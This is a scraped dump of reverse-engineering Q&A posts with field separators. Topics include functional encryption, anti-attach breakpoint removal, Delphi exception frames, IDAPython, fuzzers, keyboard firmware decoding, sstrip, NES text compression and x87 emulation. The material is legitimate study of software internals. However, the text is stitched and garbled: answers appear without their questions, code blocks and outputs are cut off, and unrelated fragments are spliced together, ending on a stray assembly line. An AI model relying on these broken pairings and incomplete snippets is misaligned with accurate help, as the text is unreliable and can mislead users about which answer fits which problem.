<p>Note that the usefulness of IOs will only become greater as time goes one. As seen in <a href=""http://eprint.iacr.org/2013/454.pdf"" rel=""nofollow"">another paper by some of the same authors</a> and hopefully they will become more practical as new constructions are proposed.</p>

<p><strong>Functional Encryption</strong> (contribution 3)<br>
Prior to this work FE has only been possible on small circuits. Using 1 and 2, with some other crypto primitives, the authors were able to build FE on all circuits. That is a very significant result.</p>

<p><strong>What does this mean for Anti-RE</strong><br>
It would appear that by itself, indistinguishability obfuscation means very little for anti-reverse engineering. FE on any circuit, however, could be significant. Here is the reason. FE allows for results of a computation to be in plaintext. Compare this with fully homomorphic encryption (FHE) where results will be encrypted or with Multiparty Comptuation were we require multiple parties (but can have plaintext results). Thus, I could give you a key which would allow you to, say, AES decrypt any data I send to you. You would never know the AES key though. There are techniques that also allow you to <a href=""http://eprint.iacr.org/2013/283.pdf"" rel=""nofollow"">hide the function</a> (not just the inputs).</p>

<p>Imagine if you had the ability to allow someone to compute only a specific function(s) on private data that I send you and still get plaintext results. Furthermore, the function is hidden, so they can't reverse engineer the function. That is the contribution of FE, and FE on any circuit is what this work enables.</p>

<p><strong>Practicality</strong><br>
From what I see in the paper, contribution 1 could be practical for real world use, though I am not completely sure. Multilinear maps are pretty inefficient at the moment, but the construction used here is somewhat simplified. Since 2 uses FHE, it isn't practical yet. Since 3 uses 2 and some other heavy-weight crypto, it is also, not practical at the time.</p>

"Why was my memory breakpoint not triggered in OllyDbg?","1659","","<p>I am currently battling this protection on an 32-bit executable. </p>

<p>At some point during it's runtime, the protection gets the address of <code>DbgUiRemoteBreakin</code> and writes a <code>JMP</code> to <code>ExitProcess</code> as an anti-attach technique. I decided to place a memory breakpoint on write(I also tried access) on that location figuring at the very least I'd find out what piece of code alters the code. Upon setting the breakpoint I hit <kbd>F9</kbd> only for my memory bp to never be triggered, I tried multiple times. The code was altered, but my memory bp was not triggered. This is the first time that a memory breakpoint was not triggered for me. I am puzzled as to why this has happened. My only guess is that <code>DbgUiRemoteBreakin</code> is located in <em>ntdll.dll</em> and that is why guard pages don't work there.
There were also instances where I had a crash when I set a memory bp on that function.</p>

<p>However I am hoping somebody has encountered this and can explain more in depth. My ollydbg version is 1.10.</p>
","<p>The most likely reason why your breakpoint didn't get hit is because the protected file removed it.</p>

<p><strong>Edit</strong>: If the breakpoint was hardware-based, then the protected file can use <code>GetThreadContext()</code>, erase the DR entries, <code>SetThreadContext()</code>. If the breakpoint was page-protection-based, then the protected file can use <code>VirtualProtect()</code>.</p>

"Delphi Pascal Try..Except..Finally block","1654","","<p>I'm having trouble reverse-engineering a specific Delphi Pascal .exe (old vsn., pre-1995 so probably v.3).

<p>-- this is output from my own disassembler, but I don't think there are errors in it. The labels have been auto-named, but I still cannot follow the 'logic' (if any) from one block to the next. In particular, the bottom half, right before the function epilogue, confuses me.</p>

<p>Are these fragments enough to reconstruct the original <code>try</code>..<code>finally</code> blocks?</p>

<hr>

<p>After reading Igor's answer: yes they are. Consider these flowcharts: left, original before special handling of try/finally blocks, right, afterwards.</p>

<p><img src=""https://i.stack.imgur.com/1B6lK.png"" alt=""flowcharts""></p>

<p>In the original flowchart, I considered every jump from one basic block to another as a <em>link</em>, and the code flow stops at every <code>retn</code>. <code>if</code> (E-(F)-K) and <code>if-else</code> (G-H/I-J) structures can clearly be discerned. However, pushing return addresses and the other 'tricks' of exception handling, defeat this, as can be seen by the dangling blocks N and O -- they 'enter' from nowhere --, and a separate block 'M' which comes and goes from nowhere.</p>

<p>At the right, I separated the <em>initialization</em> of the exception block from the main code (adding a new block B), and concatenated the <em>finalize</em> structure into one single new block (M), which ultimately jumps to an AFTER_TRY (which happened to be the last <em>Exit</em> block). Now it's clear that</p>

<ol>
<li>right after the prologue, a <code>try</code> is initiated;</li>
<li>all code ends up at the <code>finally</code> block M, which</li>
<li>then always exists the code at a single fixed point.</li>
</ol>
","<p>Delphi implements <code>try</code>/<code>except</code>/<code>finally</code> by using Win32 Structured Exception Handlers (SEH). The basics of SEH are explained in the <a href=""http://www.microsoft.com/msj/0197/Exception/Exception.aspx"" rel=""nofollow"">classic article by Matt Pietrek</a>, so I'll skip to the details relevant to Delphi only.</p>

<h1>1. <code>try</code> entry</h1>

<p>Entry to a <code>try</code> block, or a block which protects automatic variables that need to be destructed on exit (such as strings) looks like the following:</p>

<pre><code>xor     eax, eax
push    ebp
push    offset SEH_HANDLER
push    dword ptr fs:[eax]
mov     fs:[eax], esp
</code></pre>

<p>This is a typical way of setting up a SEH frame. After it's run, top of the stack will look like this:</p>

<pre><code>       +-----------+
ESP+00 |    next   | &lt;- fs:[0] points here
       +-----------+
ESP+04 |  handler  |
       +-----------+
ESP+08 | saved_ebp |
       +-----------+
</code></pre>

<p>The pointer to this structure will be passed to the SEH handler.</p>

<h1>2. <code>try</code> exit</h1>

<p>At the end of the <code>try</code> block, the SEH frame is torn down:</p>

<pre><code>    xor     eax, eax
    pop     edx               ; pop 'next' into edx
    pop     ecx               ; pop handler
    pop     ecx               ; pop saved_ebp
    mov     fs:[eax], edx     ; move 'next' into fs:[0]
</code></pre>

<p>If there is a <code>finally</code> handler or automatic destructors, then it continues like this:</p>

<pre><code>    push    offset AFTER_TRY  ; make it so the 'ret' will jump to AFTER_TRY
FINALLY_HANDLER:
    &lt;destruct automatic variables created in the try block&gt;
    &lt;finally handler body&gt;
    ret                       ; jumps to AFTER_TRY
</code></pre>

<p>Otherwise there is a simple jump:</p>

<pre><code>    jmp AFTER_TRY
</code></pre>

<h1>3. <code>finally</code> handler</h1>

<p>In case the program use <code>finally</code> statement, or in case of the <code>try..finally</code> added by the compiler to guard automatic variables, the SEH handler looks like this:</p>

<pre><code>SEH_HANDLER:
    jmp     _HandleFinally
    jmp     FINALLY_HANDLER
</code></pre>

<h1>4. <code>except</code> handler</h1>

<p>If the program uses an <code>except</code> handler to catch all exceptions, the code looks a little different:</p>

<pre><code>SEH_HANDLER:
    jmp     _HandleAnyException
    &lt;handler code&gt;
    call    _DoneExcept
</code></pre>

<h1>5. <code>except on</code> handlers</h1>

<p>If the program uses <code>except on...</code> to match the exception(s) being caught, the compiler generates a table of one or more possible exception classes with corresponding handlers:</p>

<pre><code>SEH_HANDLER:
    jmp     _HandleOnException
    dd &lt;numExceptions&gt;
    dd offset ExceptionClass1
    dd offset OnException1_handler
    dd offset ExceptionClass2
    dd offset OnException2_handler
    &lt;...&gt;

OnException1_handler:
    &lt;handler code&gt;
    call    _DoneExcept

OnException2_handler:
    &lt;handler code&gt;
    call    _DoneExcept
</code></pre>

<p>There may be some variations, but I think I covered most of it.</p>

<p>The source code of <code>_HandleFinally</code>, <code>_HandleAnyException</code>, <code>_HandleOnException</code>, <code>_DoneExcept</code> and a few other exceptions-related functions can be found in <code>system.pas</code> in the VCL sources.</p>

","<p>I received an answer from HexRays support which has a solution which does not rely on parsing the C string retrieved by <code>GetType(ea)</code>.</p>

Python&gt;tif = tinfo_t()
Python&gt;get_tinfo2(here(), tif)
True
Python&gt;funcdata = func_type_data_t()

Python&gt;
Arg 0: argc (of type int, and of location: 1)
Arg 1: argv (of type const char **, and of location: 1)
Arg 2: envp (of type const char **, and of location: 1)
</code></pre>

<p>Note that it tells me the location type is <code>1</code>, which corresponds
to 'stack':

<p>Now, let's assume I change the prototype to this:</p>

<pre><code>.text:0804ABA1 ; int __usercall main@&lt;eip&gt;(int argc@&lt;eax&gt;, const char **argv@&lt;esp&gt;, const char **envp@&lt;edx&gt;)

<p>Then:</p>

<pre><code>Python&gt;get_tinfo2(here(), tif)
True
Python&gt;tif.get_func_details(funcdata)
True
Python&gt;for i in xrange(funcdata.size()):
Python&gt;    print ""Arg %d: %s (of type %s, and of location: %s)"" % (i, funcdata[i].name, print_tinfo('', 0, 0, PRTYPE_1LINE, funcdata[i].type, '', ''), funcdata[i].argloc.atype())
Python&gt;
Arg 0: argc (of type int, and of location: 3)
Arg 1: argv (of type const char **, and of location: 3)
Arg 2: envp (of type const char **, and of location: 3)
</code></pre>

<p>Argument location type is <code>3</code> now, which corresponds to 'inside
register'.</p>

<p>(Then, I would have to use <code>reg1()</code> to retrieve the actual
register number to know <em>what</em> register the argument is
passed in)</p>

","<p>I do not think code morphism is <em>the</em> or <em>an</em> answer to this question. </p>

<p>What the question was about is obfuscating the algorithm implementation by using less common or undocumented assembly instructions. This can actually be done by some compilers when extensive optimizations are turned on. For example compilers like the <strong>Intel C Compiler</strong>, <strong>GCC</strong>, or <strong>PGI</strong> can autovectorize loops when matched to some internal patterns (<em>reductions</em>, <em>matrix multiplications</em>, ...) and when the target architecture supports vectorization. Other optimizations can lead to extremely tricky assembly code but still, it can always be reversed since the compiler performs no <strong>explicit</strong> obfuscation and because most of what the compiler does is pattern matching. Of course if you associate a high level pattern to a low level one, well, you lose the obfuscation and your code can easily be reversed. Thus techniques as the one you're looking for can only be performed by hand either by writing high level code using compiler intrinsics and alternative constructs or at the assembly level.   </p>

<p>If you are really interested in obfuscation techniques I recommend you going over Jan CAPPAERT's PhD thesis : <a href=""https://www.cosic.esat.kuleuven.be/publications/thesis-199.pdf"">https://www.cosic.esat.kuleuven.be/publications/thesis-199.pdf</a>, it covers some nice techniques used not only on malware but on industrial software too. The bibliography is quite rich.
You can also check this talk given by Sean Taylor at Defcon on how to make the compiler do the obfuscation : <a href=""https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-sean_taylor-binary_obfuscation.pdf"">https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-sean_taylor-binary_obfuscation.pdf</a>.</p>

<p>About polymorphism, it is a nice obfuscation technique though it is rarely used in malware nowadays, and for many reasons. One of them is that few, if none, malware authors write code in assembly anymore, and most use frameworks and engines. You have to keep in mind that writing obfuscated assembly code is an art ... and that now it is used to harden the reverse engineering process for profit not for the challenge.</p>

<p>I've been working on a <strong>GCC</strong> plugin that adds an optimization pass which performs code obfuscation on the IR - internal representation (GIMPLE) - of a code before applying another obfuscation pass at the assembly level. The interesting thing about this approach is that you have the CFG (Control Flow Graph) of the program at compile time, and you can apply many obfuscation algorithms and techniques in order to break it into other equivalent CFGs and then assess which suites best and use it throughout the remaining compilation phases.</p>

"State of the Art Fuzzing Framework","1636","","<p>I've previously rolled my own Fuzzing Framework, and tried a few others like Peach Fuzzer.  It's been awhile since I've looked at vulnerability hunting, what is the state of the art with regard to fuzzing?  That is, if I were to start fuzzing Acme Corp's PDF Reader today, what toolset should I look into?  </p>
","<p>There are three types of fuzzers:</p>

<ul>
<li><em>mutation fuzzers</em>, which start with a large list of diverse, good input files and a list of mutations. Then, each file is mutated in some way and passed to the application to see if the app can handle the mutated input. Charlie Miller's 2010 <a href=""http://fuzzinginfo.files.wordpress.com/2012/05/cmiller-csw-2010.pdf"" rel=""nofollow"">CanSecWest talk</a> covers this approach nicely. Generally it's straightforward to roll your own version of a mutation fuzzer for a file format.</li>
<li><em>generative fuzzers</em>, which at their simplest just generate random output. More complex versions will be able to describe protocols and methods for injecting randomness in various fields of the protocols. <a href=""https://github.com/OpenRCE/sulley"" rel=""nofollow"">Sulley</a> is a tool in this class. A particularly nice subclass is <em>grammar-based</em> fuzzers, where you start with a BNF grammar and generate strings by walking the grammar directly.</li>
<li><em>whitebox fuzzers</em> are arguably a different class, where some constraint solver reasons about code paths to generate new inputs for fuzzing. <a href=""https://code.google.com/p/avalanche/"" rel=""nofollow"">avalanche</a> is a publicly available tool for this. (SAGE, the tool that @0xea pointed out, is another example.)</li>
</ul>

<p><a href=""http://securityevaluators.com/files/papers/analysisfuzzing.pdf"" rel=""nofollow"">Another of Miller's papers</a> has a nice overview of the first two. And you should probably see the <a href=""http://www.fuzzing.org/"" rel=""nofollow"">Fuzzing book's website</a>, which has some software you can start with.</p>

"What are nullsub_ functions in IDA?","1624","","<p>In nearly every dis-assembly created by IDA, there are several functions that are marked <code>nullsub_</code> which according to IDA, return <del><code>null</code></del> nothing (just <code>ret</code> instruction). </p>

<p>So, what are those and why are they in the database?</p>
","<p><em>I'm answering from a C++ viewpoint, other languages have different reasons.</em></p>

<p>There are legitimate uses for these functions, even if they are nothing more than</p>

<pre><code>void func(/* any args */) {}
</code></pre>

<p>One example that comes to mind is a virtual function that does nothing in a base class but is overridden in a derived class. A similar example would be a template function whose general case is empty but specializations are not.</p>

<p>One more case is static variables. A static variable destructor has to be called at the end of the program, which usually uses <code>atexit</code> to register the destructor callback when the variable is accessed for the first time. As I recall, the C++ standard says that a destructor with no observable behaviour might not be invoked, but I have seen MSVC 6.0 register <code>nullsub</code>s as destructors anyway.</p>

<p>Global variables follow rules similar to static ones.</p>

<p>Another possibility is a function that simply has no effect, <em>according to the compiler</em>. The function has to exist in case something (e.g. another compilation unit that doesn't know the implementation is empty) tries to call it, but its body is empty. <br />
Mind that ""according to the compiler"" is not always equal to the coder's understanding. I myself once wrote a cleanup function that did a lot of work, but by mistake it took the argument by value instead of by reference. The compiler optimized the entire function body to a <code>{}</code> without any warning. Oops.</p>

"Finding the actual Thumb code in firmware","1615","","<p>I'm planning to buy my first mechanical keyboard, a KBT Poker II, and apart from the physical characteristics of it, another thing that caught my attention is that it sports reflashable firmware! Reversing and hacking on the firmware would be a fun personal project. (Unfortunately, the flasher is windows-only... I'm not sure how to deal with that, but that's another question.)</p>

<p>Sadly though, when I tried poking around with the firmware files I couldn't make sense of it--I tried running a few Thumb disassemblers (as well as hacking up my own to learn more about Thumb) on parts of it that would seem to contain code (upon hexdump inspection), but they all came up with garbage instruction as far as a I could tell--certainly no function prologues/epilogues, and a lot of crazy immediates all over the place as well as absurd amounts of shifts and LDMs.</p>

<p>Some technical information on the hardware inside the keyboard: it's built around a <a href=""http://www.nuvoton.com/hq/products/microcontrollers/arm-cortex-m0-mcus/nuc120-122-123-220-usb-series/nuc122sc1an/"">Nuvoton NUC122SC1AN</a>, which features a Cortex-M0 CPU.  The firmware files in question are supplied in an attachment to <a href=""http://geekhack.org/index.php?topic=50245.0"">this forum post</a> (by the keyboard manufacturer).</p>

<p>What I <em>have</em> found, however, is the interrupt table located at <code>$0000</code>--its length exactly matches that of the one documented on ARM's website, including IRQs 0..31. However, another oddity here is that they all point to interrupts in the high memory--<code>$ffff_fff00</code> and such.  This area isn't included in the memory map of the NUC122, and ARM's spec has it as ""reserved"", but I'm guessing it might be mapped to some internal memory containing the chip-flashing-receiving code and such, and that the interrupts either trampoline to user (firmware) code or the table gets overwritten with interrupt handlers supplied by the firmware. Anyway, I'd probably be able to figure that out once I have some code to look at.</p>

<p>I've tried binwalking the files, and it came up empty for all of them.</p>

<p>To be clear, <strong>what I'm looking for</strong> in an answer here is guidance to where I find the actual executable code in one of the firmware files above (supplied by the manufacturer itself, so there should be no legal isues here), because I'm really not getting it. I should add that I'm relatively new to the world of reversing.  Thanks!</p>
","<p>I downloaded the archive you referenced and the first thing I noticed was that the firmware files are very heavy in the 0x80 - 0xff range.  Inverting each byte resulted in a much nicer byte distribution and looked like it had some structure but still not quite right.  I assume that since they went as far as inverting the bytes, they might have done some bit-manipulation such as XOR.</p>

<p>Since this file is a firmware update, there is usually a header or a footer.  It looks like there is a header of offsets or something, but nothing made sense.  Scrolling further through the file, around byte 35000, there appears to be a block of structured data, followed by a block of 0xff and then a 16-byte ""footer"":</p>

<pre><code>003F1F0: 84 95 74 64 B4 63 13 14 00 00 00 00 3C DC C5 6C   ..td.c......&lt;...
</code></pre>

<p>The first 8 bytes look like a good place to start.  Going through a few common XOR strategies resulted in nothing.  Then I noticed that these bytes have a low nibble of 3, 4 or 5 which would place them in the printable ASCII range.  So swap the nibbles of each byte (aka rotate left 4 bits) ... :</p>

<pre><code>003F1F0: 48 59 47 46 4B 36 31 41 00 00 00 00 C3 CD 5C C6   HYGFK61A........
</code></pre>

<p>Bingo!  Since the firmware updater window title is ""HY USB Firmware Downloader"", I think this is a winner.  Loading the resulting file into IDA, Cortex M-0 Thumb 2 settings, and sure enough, we have valid code starting at offset 0x0120 and ASCII string block at offset 0x32121.</p>

<p>Summary: Decode the .bin files by processing each byte as:</p>

<pre><code>rotate left 4 bits and invert:  
c = (((c &amp; 0x0f) &lt;&lt; 4) | ((c &amp; 0xf0) &gt;&gt; 4)) ^ 0xff

How can I retrieve this information when using the idapython API?</p>
","<p>When looking for functions, you should always check the SDK headers. These two are listed in <code>loader.hpp</code>:</p>

<pre><code>// Get offset in the input file which corresponds to the given ea
// If the specified ea can't be mapped into the input file offset,
// return -1.    
idaman int32 ida_export get_fileregion_offset(ea_t ea);

ea = idaapi.get_fileregion_ea(offset)

<p>This is how Wikipedia describes <a href=""http://en.wikipedia.org/wiki/Visual_C++_name_mangling"">Name Mangling for Visual C++ series of compilers</a>:</p>

<blockquote>
  <p>Visual C++ name mangling is a mangling (decoration) scheme used in Microsoft Visual C++ series of compilers. It provides a way of encoding name and additional information about a function, structure, class or another datatype in order to pass more semantic information from the Microsoft Visual C++ compiler to its linker. Visual Studio and the Windows SDK (which includes the command line compilers) come with the program undname which may be invoked to obtain the C-style function prototype encoded in a mangled name. The information below has been mostly reverse-engineered. There is no official documentation for the actual algorithm used.</p>

"No dynamic symbol table but resolution of method from shared libraries is working","1588","","<p>I want to find how can I identify calls to shared libraries in GDB only. On a stripped binary, I cannot found the dynamic symbol table:</p>

<pre><code>$&gt; objdump -tT crackme-01

objdump: crackme-01: not a dynamic object

</code></pre>

<p>But still the dynamic library resolution is present, for instance before the call to <code>strcmp</code>:</p>

<pre><code>0x08048330 in ?? ()

<p>My question is how the symbol table is hidden from <code>readelf</code> but still be used during execution ?</p>
","<p>In fact, they probably used the <code>sstrip</code> software from the package <a href=""http://www.muppetlabs.com/~breadbox/software/elfkickers.html"" rel=""nofollow"">ElfKicker</a>. According to the <code>sstrip</code> <code>README</code> file:</p>

<blockquote>
  <p>sstrip is a small utility that removes the contents at the end of an
  ELF file that are not part of the program's memory image.</p>
  
  <p>Most ELF executables are built with both a program header table and a
  section header table. However, only the former is required in order
  for the OS to load, link and execute a program. sstrip attempts to
  extract the ELF header, the program header table, and its contents,
  leaving everything else in the bit bucket. It can only remove parts of
  the file that occur at the end, after the parts to be saved. However,
  this almost always includes the section header table, along with a few
  other sections that are not involved in program loading and execution.</p>
  
  <p>It should be noted that most programs that work with ELF files are
  dependent on the section header table as an index to the file's
  contents. Thus, utilities such as gdb and objdump will often have
  limited functionality when working with an executable with no section
  header table. Some other utilities may refuse to work with them at
  all.</p>
</blockquote>

<p>In fact, <code>sstrip</code> remove all section information from the executable and keep the executable still usable.</p>

<p>But let see the different levels is strip that we can reach.</p>

<h2>No stripping</h2>

<p>Let consider a program (similar to the one looked at in the question) with no stripping a all. </p>

<h2>Stripping with <code>sstrip</code></h2>

<p>Finally, lets take a look at what happen when using <code>sstrip</code>.</p>

<pre><code>$&gt; sstrip ./crackme-sstriped

DYNAMIC SYMBOL TABLE:

</code></pre>

<p>As you can notice, all symbols, including dynamic symbols have been removed. In fact, all the symbols pointing towards the PLT are removed and addresses are left as static addresses. Here is an example with the <code>_start</code> procedure preamble, first all the symbols:</p>

<pre><code> 0x8048390 &lt;_start&gt;:    xor    %ebp,%ebp
 0x8048392 &lt;_start+2&gt;:  pop    %esi

 0x80483b1 &lt;_start+33&gt;: hlt    
</code></pre>

<p>And, then <code>strip</code>ep:</p>

<pre><code>0x8048390:  xor    %ebp,%ebp
0x8048392:  pop    %esi
0x8048393:  mov    %esp,%ecx

0x80483b1:  hlt    
</code></pre>

<p>And, finally, the <code>sstrip</code> version:</p>

<pre><code>0x8048390:  xor    %ebp,%ebp
0x8048392:  pop    %esi
0x8048393:  mov    %esp,%ecx

"String extraction from an iNES ROM dump","1587","","<p>I want to extract the strings in <a href=""http://www.speedyshare.com/NGGVr/Shadowgate-U.nes"">Shadowgate for NES</a>. I ran <code>file</code> on the image and then <code>strings</code>, no luck. I found <a href=""http://fms.komkon.org/EMUL8/NES.html#LABM"">some information about the NES cartridge file format</a>. The docs mention the use of “Name Tables”. Is there a way to disassemble this file and view the strings? I tried</p>

<pre><code> strings -e -T rom.bin
</code></pre>

<p>I also tried :</p>

<pre><code> objdump -i rom.bin
</code></pre>

<p>The processor looks to be an M6502 processor and there are Windows disassemblers available.</p>
","<p>There are several approaches to locating strings in an unknown file. One you already tried: <code>strings</code>. This looks for plain, unencoded ASCII text:</p>

<blockquote>
  <p>Strings  looks  for  ASCII  strings in a binary file [..] A  string is any sequence of 4 (the default) or more printing characters ending with a newline or a  null. (<code>man strings</code>)</p>
</blockquote>

<p>But there are many reasons why this naive approach may fail. First off: not every text in the world is ASCII encoded. In fact, examining your file with a binary editor, you can find graphic images for the font used in the game at offset 0x20010 -- monochrome bitmaps of 8x16 pixels. If you assume the first character (a '0') is numbered zero, then 'A' is at position 31 -- definitely <em>not</em> ASCII text. Of course, it's possible the text drawing routine knows this, and re-orders characters to be printed according to this scheme; but, given the age of this particular game (1987) it is more likely that the textual data is <em>stored</em> according to this weird encoding.</p>

<p>In itself, however, this should not be a problem.</p>

<p>Googling for this game provides a number of screen shots, and you can read some of the texts that may appear -- ""The last thing you remember"", ""Word of your historic quest"", etc. --, and a noteworthy point is that all text appears to be in ALL CAPS.</p>

<p>How does that help? Well, if the encoding is <em>remotely</em> 'normal', the character code of an 'A' might be anything, but you can safely assume that <code>code+1</code> is 'B', <code>code+2</code> is 'C', and so on. Now let's assume the text ""THE"" occurs <em>anywhere</em> (a safe assumption). Subtract 'T' from the first byte in the data and note the difference. Subtract this difference from the next byte and test if it is an 'H'; if so, test the same difference on the <em>next</em> byte and see if it is an 'E'. Three times is a charm (in this case), and since the string ""THE"" ought to come up very frequent, you should see lots of hits with the same difference. Then you can write a custom routine to 'convert' <em>all</em> data bytes according to this scheme, and check again if you find useful strings.</p>

<p>That didn't work for Shadowgate.</p>

<p>Another option is that the text has been deliberately obfuscated. A popular (because <em>fast</em>) option was to <a href=""http://en.wikipedia.org/wiki/Xor"">XOR</a> text with a constant. That way the text was not readily visible when inspected with a hex viewer, yet could easily be displayed. So I did the same as above, only now with a XOR operation instead of a constant subtraction. It didn't work either.</p>

<p>Next: given that SG is a <em>text</em> adventure, it stands to reason the writers tried to stuff as much as possible text into the poor NES memory. To find <em>real world compression</em> (ZIP, LZW) in such an old game is fairly rare, the compression schemes tended to be quite simple. After all, not only RAM was limited but CPU speed as well. What if every character is stored as a 5-bit sequence? That would save lots of memory -- every 8 characters of text could be stored in just 5 bytes, a compression rate of 62.5%.</p>

<p>Why ""5-bit""? We're talking English text here, plus a handful of punctuation characters, plus (maybe) digits '0' to '9'. The alphabet itself is 26 characters long, which leaves another 6 values for anything else -- and, hey, one of the extra codes could mean ""for the next character use all 8 bits"".</p>

<p>Checking every 5 bits against my test string (which in cryptography is called a <a href=""http://en.wikipedia.org/wiki/Crib_%28cryptanalysis%29"">""crib""</a>), I found the following:</p>

<pre><code>candidate at 0570, delta is 41 H_A\`THE[TROLL[

</code></pre>

<p>.. and many more. You can see it works, because I also decoded a few bytes before and after the test string, and that's recognizable as 'something' as well. The 'delta' shown is the difference between the five-bit code (0..31) and ASCII, and you can see it's <code>41</code> for the majority of strings (the only exception seems a false positive).</p>

<p>To assure that this <em>is</em> correct, I tried with another crib: <code>KING</code> (it's a fantasy game):</p>

<pre><code>candidate at 0661, delta is 41 Y[LOOKING[SPEAR
candidate at 23B4, delta is 41 [DRINKING[TAR_A
candidate at 2B5D, delta is 41 [DRINKING_A\`AA
candidate at 8E1B, delta is 43 \XVFDKINGDHEEVE
candidate at 146F9, delta is 34 JL54HKING48A4:D
</code></pre>

<p>That seems to work out as well: not the 'king' I was expecting, but nevertheless good results with a delta of 41, random stuff with another delta.</p>

<p>But finding useful strings this way is rather fortunate, because of course there is no guarantee that reading every 5 bits <em>starting at the first byte</em> should display anything useful. There may be lots of other strings in between the ones shown, but they didn't happen to start on a multiple of 5*8 bits. Suppose there was no text at position #0, but there <em>was</em> at position #1, then I cannot see it:</p>

<pre><code> bits for byte 0,1
 0000.0000 TTTT.T000 (T = Text character bits)
 ---
 reading 1st 5 bits
 1111.1??? ????.????
 2nd 5 bits -- the wrong ones!
 .... .111 11??.????
</code></pre>

<p>To properly decode <em>all</em> strings, you'd now take the following route:</p>

<ul>

"Unpacking binary statically","1587","","<p>Say I have a binary that I'm not able to execute (for example it runs on some device that I don't have one of), but I can disassemble it. I can get the docs on the architecture. (It's MIPS little endian in my case.) But the binary has very few imports, very few strings, etc., so it really seems like it's packed.</p>

<p>How can I go about <em>statically</em> unpacking it? (Edit: I mean, unpacking it without any access to the original device.)</p>
","<p>Over the 30+ embedded device firmwares I've seen in the past I have rarely seen them using anything proprietary. Often it's just gzip/LZMA or a similar compression they're using (albeit sometimes with modified or stripped headers). </p>

<p>Thus as a first step I would try something like <a href=""http://code.google.com/p/binwalk/"">binwalk</a> to search for known compression algorithms. If that doesn't help try tools for finding crypto constants such as <a href=""http://www.hexblog.com/ida_pro/files/findcrypt2.zip"">Find Crypt</a> or <a href=""http://aluigi.altervista.org/mytoolz/signsrch.zip"">Sign search</a>. This only works if the crypto is a software implementation. If it's a more sophisticated device, say a set-top-box, with a hardware accelerated decryption engine and OTP memory for storing the key then you're out of luck without run-time access (unless they greatly screw up passing the key from OTP to the decryption engine).</p>

<p>Finally you could try to find out if they use some proprietary algorithm and either emulate that algorithm using <a href=""http://wiki.qemu.org/Main_Page"">QEMU</a> or <a href=""http://gxemul.sourceforge.net/"">gxemul</a> or write your own decompressor in higher level language.</p>

"What is the protocol for x87 floating point emulation in MS-DOS?","1583","","<p>I'm trying to get useful results using the <a href=""https://github.com/uxmal/reko"">Reko decompiler</a> on a dusty old MS-DOS binary compiled with Borland C++ that appears to be performing a lot of floating point arithmetic. I'm seeing code sequences like</p>

<pre><code>mov ax,0x4D8C    ; segment selector
mov es,ax
int 0x3C         ; call x87 emulator??
fld dword ptr [&lt;some address&gt;]
sub sp,8
int 0x39         ; call x87 emulator??
</code></pre>

<p>...etc. A cursory search engine search strongly hints that the <code>int</code> instructions are invoking an x87 emulation library; when the x87 is present, it lets the coprocessor execute the instruction, but when it isn't, the emulator emulates.</p>

<p>I am well familiar with how to <em>implement</em> FPU operations, with shifts and whatnot. What I'd like to find out more about is the protocol of these invocations to the emulator. I have been unable to locate documentation. Perhaps one of the members of the RE community does?</p>
","<p>Nothing like asking a question on stackexchange, only to be humiliated by finding the answer (or at least part of it). After finding the following source file, it started making sense:</p>

<p><a href=""https://github.com/alexhenrie/wine/blob/master/dlls/krnl386.exe16/fpu.c"">https://github.com/alexhenrie/wine/blob/master/dlls/krnl386.exe16/fpu.c</a></p>

<p>On old 8086 machines, where there is no trap for invalid instructions, the Elders of the Past came up with an emulation strategy. All x87 instructions are in the <code>D8</code>-<code>DF</code> range (8 possible values) followed by modrm and other goodness. If you prefix the instruction with a <code>FWAIT</code> (opcode <code>9B</code>), you guarantee that there always be two bytes of code before the modrm byte, looking something like <code>9B Dx</code>. However, instead of emitting those two bytes, the compiler emits <code>CD xx</code>, where xx ranges <code>34</code>-<code>3B</code> (8 possible values). As we all know, CD is the encoding of the x86 <code>int</code> instruction.</p>

<p>When the CPU executes the <code>int</code> instruction and arrives at the handler for <code>34</code>-<code>3B</code>, it vectors off to the interrupt handler.  If there isn't an x87 coprocessor available, the handler will emulate the floating point instruction, maintaining the coprocessor state in memory. If however there <em>is</em> an x87 coprocessor present, the handler will peek at the return stack to see where the <code>int</code> instruction is located, and <em>overwrite it</em> with the appropriate <code>9B Dx</code> byte sequence, corresponding to the <code>CD 3x</code> byte sequence. It then returns control to the patched instruction so that it gets executed. Now that it has been patched, the instruction is an actual FPU instruction, and future executions of the instructions will no longer take the long detour through the emulator.</p>

<p>The documentation for how to deal with interrupt <code>3E</code> is still not forthcoming. However, for the time being, I have enough information to implement x87 emulation support in the Reko decompiler.</p>

"How to determine if binary has symbol table","1570","","<p>Is there a practical way to find if the raw binary (firmware image for example) has symbol table ? Finding start or end of it ? And if it exists is it a single block or can it be seperate multiple blocks with another data inbetween ?    </p>
","<p>I worked with some types of symbol tables. All these types are very different and can not be defined as something that allows automatic detection. It can be some kind of list of tuples like (pointer to name, type, pointer to object, [something else]). There are a lot of other variants also. 
Any time I succeeded to recognize symbol table it was done by manual inspection of analyzed dump. </p>

<p>My methodology to find such symbol table is as follows (assuming that IDA didn't find it automatically):</p>

<p>1 - Find all strings in the binary, sort them and inspect results.
    If you see a lot of potential object names (function names, global variable names etc) you can suspect that you can use it and it is possible that there is symbol table in the binary.  </p>

<p>2 - Choose some strings from the set. Check references to them. If you find 
these references in something that looks like array of structures or any other regular data structure it might be your symbol table.</p>

<p>3 - When you understand what is the structure of your symbol table you can rename your objects with simple IDAPython script.</p>

"How can I get a running thread's start address on linux?","1569","","<h2>Problem Statement</h2>

<p>I'm trying to get the address of a running thread's <code>start_routine</code> as passed in the <code>pthread_create()</code> call.</p>

<h2>Research so far</h2>

<p>It is apparently not in <code>/proc/[tid]/stat</code> or <code>/proc/[tid]/status</code>.</p>

<p>I found that <code>start_routine</code> is a member of <code>struct pthread</code> and gets set by <code>pthread_create</code>[<a href=""http://fxr.watson.org/fxr/source/nptl/pthread_create.c?v=GLIBC27;im=excerpts#L455"">1</a>].
If I knew the address of this <code>struct</code>, I could read the <code>start_routine</code> address.</p>

<p>I also found <code>td_thr_get_info</code> defined in the debugging library <code>thread_db.h</code> [<a href=""http://fxr.watson.org/fxr/source/nptl_db/td_thr_get_info.c?v=GLIBC27#L27"">2</a>]. It fills a <code>struct</code> with information about the thread, including the start function [<a href=""http://fxr.watson.org/fxr/source/nptl_db/thread_db.h?v=GLIBC27#L259"">3</a>]. But, it needs a <code>struct td_thragent</code> as an argument and I don't know how to create it properly.</p>

<pre><code>   push esi ; save ESI (it gets restored later)
